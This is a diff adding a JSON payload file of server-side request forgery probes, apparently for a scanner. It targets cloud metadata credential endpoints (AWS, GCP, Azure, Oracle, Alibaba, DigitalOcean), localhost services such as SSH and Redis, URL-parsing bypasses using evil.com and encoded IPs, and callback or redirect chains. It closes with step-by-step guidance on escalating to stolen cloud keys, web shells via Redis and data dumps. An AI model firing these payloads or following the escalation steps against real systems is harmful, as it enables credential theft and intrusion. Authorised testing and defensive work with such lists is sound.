@@ -1,0 +1,592 @@
+{
+  "category": "ssrf",
+  "description": " (core: cloud-metadata / internal / url-bypass / redirect)",
+  "contexts": {
+    "cloud_metadata": {
+      "description": "SSRF probes targeting cloud provider metadata endpoints (AWS, GCP, Azure, DigitalOcean, Oracle, Alibaba)",
+      "tech_match": [
+        "AWS",
+        "GCP",
+        "Azure"
+      ],
+      "param_match": [
+        "url",
+        "uri",
+        "path",
+        "dest",
+        "redirect",
+        "site",
+        "html",
+        "feed",
+        "to",
+        "out",
+        "callback",
+        "domain",
+        "rurl",
+        "return"
+      ],
+      "probes": [
+        {
+          "payload": "http://169.254.169.254/latest/meta-data/",
+          "description": "AWS IMDSv1 metadata endpoint \u2014 ami-id or instance-id confirms SSRF to AWS metadata",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "ami-id",
+                "instance-id",
+                "iam"
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 90,
+          "variables": {}
+        },
+        {
+          "payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+          "description": "AWS IAM credentials endpoint \u2014 role name in response reveals attached IAM role. Follow-up GET reveals AccessKeyId / SecretAccessKey / Token.",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "AccessKeyId",
+                "SecretAccessKey",
+                "Token",
+                "arn:aws:iam",
+                "iam-role-name"
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 85,
+          "variables": {}
+        },
+        {
+          "payload": "http://metadata.google.internal/computeMetadata/v1/",
+          "description": "GCP metadata endpoint \u2014 requires Metadata-Flavor header bypass",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "instance",
+                "project"
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 80,
+          "variables": {}
+        },
+        {
+          "payload": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+          "description": "Azure IMDS endpoint \u2014 compute details confirm Azure SSRF",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "subscriptionId",
+                "resourceGroupName",
+                "vmId"
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 85,
+          "variables": {}
+        },
+        {
+          "payload": "http://169.254.169.254/metadata/v1.json",
+          "description": "DigitalOcean metadata endpoint \u2014 droplet_id or region in response confirms SSRF to DO metadata",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "droplet_id",
+                "region",
+                "interfaces",
+                "floating_ip"
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 85,
+          "variables": {}
+        },
+        {
+          "payload": "http://169.254.169.254/opc/v1/instance/",
+          "description": "Oracle Cloud IMDS endpoint \u2014 compartmentId or shape in response confirms SSRF to OCI metadata",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "compartmentId",
+                "shape",
+                "availabilityDomain",
+                "ocid1"
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 85,
+          "variables": {}
+        },
+        {
+          "payload": "http://100.100.100.200/latest/meta-data/",
+          "description": "Alibaba Cloud ECS metadata endpoint \u2014 instance-id or region-id confirms SSRF to Alibaba Cloud metadata",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "instance-id",
+                "region-id",
+                "zone-id",
+                "image-id"
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 85,
+          "variables": {}
+        }
+      ]
+    },
+    "internal": {
+      "description": "SSRF probes targeting internal network resources and localhost services",
+      "tech_match": [],
+      "param_match": [
+        "url",
+        "uri",
+        "path",
+        "dest",
+        "redirect",
+        "site",
+        "html",
+        "feed",
+        "to",
+        "out",
+        "callback",
+        "domain",
+        "rurl",
+        "return"
+      ],
+      "probes": [
+        {
+          "payload": "http://127.0.0.1/",
+          "description": "SSRF to localhost root \u2014 length diff indicates internal content served",
+          "matchers": [
+            {
+              "type": "length_diff",
+              "min_diff": 100
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 40,
+          "variables": {}
+        },
+        {
+          "payload": "http://127.0.0.1:22/",
+          "description": "SSRF to localhost SSH port \u2014 SSH banner in response confirms internal reach",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "ssh",
+                "refused",
+                "OpenSSH"
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 65,
+          "variables": {}
+        },
+        {
+          "payload": "http://127.0.0.1:6379/",
+          "description": "SSRF to localhost Redis \u2014 Redis error banner confirms internal reach",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "-ERR",
+                "NOAUTH",
+                "redis"
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 75,
+          "variables": {}
+        },
+        {
+          "payload": "http://0.0.0.0/",
+          "description": "SSRF via 0.0.0.0 alias for localhost bypass",
+          "matchers": [
+            {
+              "type": "length_diff",
+              "min_diff": 100
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 35,
+          "variables": {}
+        },
+        {
+          "payload": "{{callback}}",
+          "description": "Out-of-band SSRF detection via collaborator callback URL",
+          "matchers": [
+            {
+              "type": "length_diff",
+              "min_diff": 100
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 50,
+          "variables": {}
+        }
+      ]
+    },
+    "url_bypass": {
+      "description": "SSRF filter bypass via URL parsing ambiguities \u2014 at-sign, fragment, shortened IP, zero IP, backslash tricks from HackTricks",
+      "tech_match": [],
+      "param_match": [
+        "url",
+        "uri",
+        "path",
+        "dest",
+        "redirect",
+        "site",
+        "html",
+        "feed",
+        "to",
+        "out",
+        "callback",
+        "domain",
+        "rurl",
+        "return"
+      ],
+      "probes": [
+        {
+          "payload": "http://127.0.0.1@evil.com/",
+          "description": "At-sign URL parsing trick \u2014 some parsers use evil.com as host while fetchers use 127.0.0.1 as auth host",
+          "matchers": [
+            {
+              "type": "length_diff",
+              "min_diff": 100
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 45,
+          "variables": {}
+        },
+        {
+          "payload": "http://evil.com#@127.0.0.1/",
+          "description": "Fragment bypass \u2014 some validators stop at # treating 127.0.0.1 as fragment, fetcher uses it as host",
+          "matchers": [
+            {
+              "type": "length_diff",
+              "min_diff": 100
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 40,
+          "variables": {}
+        },
+        {
+          "payload": "http://127.1/",
+          "description": "Shortened localhost IP \u2014 127.1 resolves to 127.0.0.1 on most systems, bypasses full-quad filters",
+          "matchers": [
+            {
+              "type": "length_diff",
+              "min_diff": 100
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 50,
+          "variables": {}
+        },
+        {
+          "payload": "http://0/",
+          "description": "Zero IP \u2014 resolves to 0.0.0.0 which maps to localhost on many systems",
+          "matchers": [
+            {
+              "type": "length_diff",
+              "min_diff": 100
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 45,
+          "variables": {}
+        },
+        {
+          "payload": "http://127.0.0.1:80\\@evil.com/",
+          "description": "Backslash before @ trick \u2014 some URL parsers treat backslash as path separator, others as authority delimiter",
+          "matchers": [
+            {
+              "type": "length_diff",
+              "min_diff": 100
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 40,
+          "variables": {}
+        }
+      ]
+    },
+    "redirect_based": {
+      "description": "SSRF via open redirect chains \u2014 server fetches a URL that redirects to an internal resource",
+      "tech_match": [],
+      "param_match": [
+        "url",
+        "uri",
+        "path",
+        "dest",
+        "redirect",
+        "site",
+        "html",
+        "feed",
+        "to",
+        "out",
+        "callback",
+        "domain",
+        "rurl",
+        "return"
+      ],
+      "probes": [
+        {
+          "payload": "https://{{callback}}/redirect?url=http://169.254.169.254/",
+          "description": "SSRF via open redirect \u2014 server-side fetch follows redirect to cloud metadata endpoint; check collaborator for interaction",
+          "matchers": [
+            {
+              "type": "length_diff",
+              "min_diff": 100
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 55,
+          "variables": {}
+        },
+        {
+          "payload": "http://169.254.169.254/latest/meta-data/hostname",
+          "description": "AWS EC2 hostname metadata \u2014 short string response is high-confidence SSRF confirmation",
+          "matchers": [
+            {
+              "type": "regex",
+              "pattern": "ip-[0-9]+-[0-9]+-[0-9]+-[0-9]+"
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 90,
+          "variables": {}
+        }
+      ]
+    },
+    "proxy_verb_unsafe": {
+      "description": "SSRF via raw HTTP CONNECT / verb on absolute URL. Forward proxy mode exposes internal services.",
+      "tech_match": [
+        "nginx",
+        "haproxy",
+        "envoy"
+      ],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{{baseline}}",
+          "description": "Raw GET http://127.0.0.1:22 HTTP/1.1 \u2014 proxy-mode SSRF returns SSH banner",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "SSH",
+                "OpenSSH",
+                "Protocol mismatch"
+              ],
+              "condition": "or"
+            },
+            {
+              "type": "status",
+              "status": [
+                200,
+                502
+              ]
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 60,
+          "variables": {
+            "raw_url": "http://127.0.0.1:22/",
+            "manual_chain": true
+          }
+        }
+      ]
+    },
+    "cloud_metadata_2025_bypass": {
+      "description": "2025 bypass primitives for cloud metadata SSRF. nip.io, IPv4-mapped IPv6, octal, IMDSv2 force-header.",
+      "tech_match": [
+        "AWS",
+        "GCP",
+        "Azure"
+      ],
+      "param_match": [
+        "url",
+        "uri",
+        "callback",
+        "redirect",
+        "feed",
+        "dest"
+      ],
+      "probes": [
+        {
+          "payload": "http://169.254.169.254.nip.io/latest/meta-data/",
+          "description": "DNS-resolver bypass \u2014 nip.io reflects 169.254.169.254 in A record",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "ami-id",
+                "instance-id",
+                "iam"
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 80,
+          "variables": {}
+        },
+        {
+          "payload": "http://[::ffff:a9fe:a9fe]/latest/meta-data/",
+          "description": "IPv4-mapped IPv6 bypass \u2014 same metadata endpoint via mapped IPv6 literal",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "ami-id",
+                "instance-id",
+                "iam"
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 75,
+          "variables": {}
+        },
+        {
+          "payload": "http://0177.0.0.1/latest/meta-data/",
+          "description": "Octal IP encoding bypass \u2014 0177 = 127 in octal",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "ami-id",
+                "instance-id",
+                "iam"
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 60,
+          "variables": {}
+        }
+      ]
+    },
+    "lmdeploy_vision_url_ssrf_2026": {
+      "description": "LMDeploy vision-language model URL fetch SSRF (CVE-2026-33626 class) \u2014 image_url parameter accepts arbitrary URL, server fetches without filtering 169.254.169.254 (AWS IMDS) or http://metadata.google.internal.",
+      "tech_match": [
+        "LMDeploy"
+      ],
+      "param_match": [
+        "image_url",
+        "url",
+        "image"
+      ],
+      "probes": [
+        {
+          "payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+          "description": "AWS IMDSv1 fetch via image_url \u2014 response should contain IAM role names",
+          "matchers": [
+            {
+              "type": "regex",
+              "pattern": "(?i)(arn:aws|AccessKeyId|SecretAccessKey)"
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 70
+        }
+      ]
+    },
+    "kyverno_admission_webhook_ssrf_2026": {
+      "description": "Kyverno admission-controller RBAC bypass \u2192 SSRF (CVE-2026-4789 class) \u2014 crafted admission policy URL field triggers webhook to fetch attacker URL, reachable cloud metadata.",
+      "tech_match": [
+        "Kyverno",
+        "Kubernetes"
+      ],
+      "param_match": [
+        "url",
+        "webhookUrl",
+        "imageRegistry"
+      ],
+      "probes": [
+        {
+          "payload": "http://169.254.169.254/latest/meta-data/",
+          "description": "Force admission webhook to fetch IMDS",
+          "matchers": [
+            {
+              "type": "regex",
+              "pattern": "(?i)(iam/security-credentials|hostname:|placement/)"
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 60
+        }
+      ]
+    },
+    "phpspreadsheet_xlsx_hyperlink_ssrf_2026": {
+      "description": "PhpSpreadsheet IOFactory::load SSRF\u2192RCE (CVE-2026-34084 class) \u2014 uploaded .xlsx with <a:hyperlink target='http://collab'/> causes server-side fetch on parse. Chain with file_upload class.",
+      "tech_match": [
+        "PhpSpreadsheet",
+        "PHP"
+      ],
+      "param_match": [
+        "file",
+        "upload",
+        "attachment"
+      ],
+      "probes": [
+        {
+          "payload": "{{collaborator}}",
+          "description": "Upload xlsx with hyperlink target pointing to Collaborator subdomain \u2014 DNS hit confirms SSRF",
+          "note": "Requires file-upload + Collaborator. Generate xlsx via openpyxl with cell hyperlink set to {{collaborator}}",
+          "matchers": [
+            {
+              "type": "collaborator"
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 70
+        }
+      ]
+    }
+  },
+  "craft_guidance": [
+    "1. IDENTIFY ENTRY POINT: URL parameters (url=, redirect=, callback=, webhook=), file imports, PDF generators, image fetchers, API integrations.",
+    "2. TEST CONNECTIVITY: Send to Collaborator first. If callback received, SSRF confirmed. If not, try blind via timing (slow internal vs fast external).",
+    "3. BYPASS FILTERS: IP blocked? Use decimal (2130706433), octal (0177.0.0.1), hex (0x7f000001), IPv6 ([::1]), DNS rebinding, or redirect from your server.",
+    "4. CLOUD METADATA: AWS=169.254.169.254 (IMDSv2 needs token PUT first), GCP=metadata.google.internal, Azure=169.254.169.254 (needs Metadata:true header).",
+    "5. PROTOCOL PIVOTING: http:// blocked? Try file:// (local read), gopher:// (Redis/SMTP), dict:// (port scan), ftp://, ldap://.",
+    "6. ESCALATION: Metadata creds -> AWS CLI -> S3/RDS access. Redis -> write web shell or SSH key. Elasticsearch -> dump indices. Internal admin panels -> further exploitation.",
+    "7. BLIND DETECTION: No response body? Use DNS (Collaborator), timing (internal=slow, external=fast), or error differences (connection refused vs timeout vs success).",
+    "8. REDIRECT CHAIN: Target fetches your server -> 302 redirect to internal IP. Bypasses hostname-based filters that only check initial URL."
+  ]
+}
